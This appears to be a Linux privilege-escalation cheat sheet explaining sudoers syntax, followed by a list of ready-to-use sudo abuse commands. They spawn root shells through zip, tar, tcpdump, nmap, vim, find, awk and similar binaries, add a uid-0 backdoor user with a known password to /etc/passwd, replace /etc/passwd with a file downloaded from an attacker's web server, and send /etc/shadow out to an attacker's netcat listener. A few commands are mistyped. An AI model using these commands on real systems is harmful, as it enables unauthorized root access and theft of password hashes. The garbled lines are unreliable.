Sudoer File Syntax.

===================================================================

root ALL=(ALL) ALL

Explain 1: The root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.

The first part is the user, the second is the terminal from where the user can use the sudocommand, the third part is which users he may act as, and the last one is which commands he may run when using.sudo

touhid ALL= /sbin/poweroff

Explain 2: The above command, makes the user touhid can from any terminal, run the command power off using touhid’s user password.

touhid ALL = (root) NOPASSWD: /usr/bin/find

Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.

 

 
Exploiting SUDO Users.

====================================================================

To Exploiting sudo user u need to find which command u have to allow.
sudo -l

The above command shows which command have allowed to the current user.

sudo list

Here sudo -l, Shows the user has all this binary allowed to do as on root user without password.

Let’s take a look at all binary one by one (which is mention in the index only) and Escalate Privilege to root user.

 

 
Using zip command

=======

$ sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

Using tar command

========

$ sudo tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash

Using strace command

=========

$ sudo strace -o/dev/null /bin/bash

Using tcpdump command

=========

$ echo $’id\ncat /etc/shadow’ > /tmp/.shell

$ chmod +x /tmp/.shell

$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root

Using nmap command

=========

$ echo "os.execute('/bin/sh')" > /tmp/shell.nse 

$ sudo nmap --script=/tmp/shell.nse

Using scp command

=========

$ sudo scp -S /path/yourscript x y

Using except command

=========

$ sudo except spawn sh then sh

Using nano command

=========

$ sudo nano -S /bin/bash

type your command and hit CTRL+T

Using Find Command

sudo find /etc/passwd -exec /bin/sh \;

or

sudo find /bin -name nano -exec /bin/sh \;

Using Vim Command

=========

sudo vim -c '!sh'

Using Nmap Command

=========

Old way.

sudo nmap --interactive

nmap> !sh

sh-4.1#

Note : nmap –interactive option not available in latest nmap.

Latest Way without –interactive

echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse

Using Man Command

=========

sudo man man

after that press !sh and hit enter
Using Less/More Command

sudo less /etc/hosts

sudo more /etc/hosts

after that press !sh and hit enter
Using awk Command

 sudo awk 'BEGIN {system("/bin/sh")}'

Using nano Command

=========

nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.

touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash

sudo nano  /etc/passwd

now switch user password is : test

su touhid

Using wget Command

=========

this very cool way which requires a Web Server to download a file. This way i never saw on anywhere. lets explain this.

On Attaker Side.

·       First Copy Target’s /etc/passwd file to attacker machine.

·       modify file and add a user in passwd file which is saved in the previous step to the attacker machine.

·       append this line only =>  touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash

·       host that passwd file to using any web server.

On Victim Side.

sudo wget http://192.168.56.1:8080/passwd -O /etc/passwd

now switch user password is : test

su touhid

Note: if u want to dump file from a server like a root’s ssh key, Shadow file etc.

sudo wget --post-file=/etc/shadow 192.168.56.1:8080

Setup Listener on attacker : nc –lvp 8080

Using apache Command

=========

sadly u cant get Shell and Cant edit system files.

but using this u can view system files.

sudo apache2 -f /etc/shadow

Output is like this :

Syntax error on line 1 of /etc/shadow:

Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration

Sadly no Shell. But you manage to extract root hash now Crack hash in your machine
